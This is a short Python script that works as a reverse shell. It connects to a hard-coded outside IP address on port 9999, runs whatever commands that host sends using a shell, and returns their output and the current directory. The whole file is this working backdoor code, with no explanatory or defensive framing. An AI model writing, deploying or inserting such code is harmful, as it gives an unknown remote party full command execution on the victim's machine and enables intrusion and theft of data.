import os
import socket
import subprocess

s = socket.socket()
host = '192.241.199.166'
port = 9999
s.connect((host, port))

while True:
    data = s.recv(20480)
    if data[:2].decode("utf-8") == 'cd':
        try:
            os.chdir(data[3:].decode("utf-8"))
        except:
            pass
    if data[:].decode("utf-8") == 'quit':
        s.close()
        break
    if len(data) > 0:
        try:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
        except:
            output_str = "Command not recognized" + "\n"
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    else:
        s.close()
        break

#Close connection
